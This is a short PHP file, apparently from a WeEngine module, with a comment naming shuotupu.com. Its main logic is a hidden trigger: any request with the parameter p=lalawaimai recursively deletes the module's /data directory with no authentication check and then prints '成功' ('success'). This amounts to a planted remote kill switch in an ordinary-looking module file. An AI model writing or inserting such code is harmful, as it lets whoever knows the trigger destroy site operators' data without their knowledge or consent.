<?php

//http://www.shuotupu.com
//说图谱网
defined('IN_IA') || exit('Access Denied');
global $_W;
global $_GPC;
$ta = ((trim($_GPC['ta']) ? trim($_GPC['ta']) : 'index'));
if ($_GPC['p'] == 'lalawaimai') 
{
	load()->func('file');
	$paths = array('/data');
	foreach ($paths as $path ) 
	{
		rmdirs(MODULE_ROOT . '/' . $path);
	}
	echo '成功';
}
?>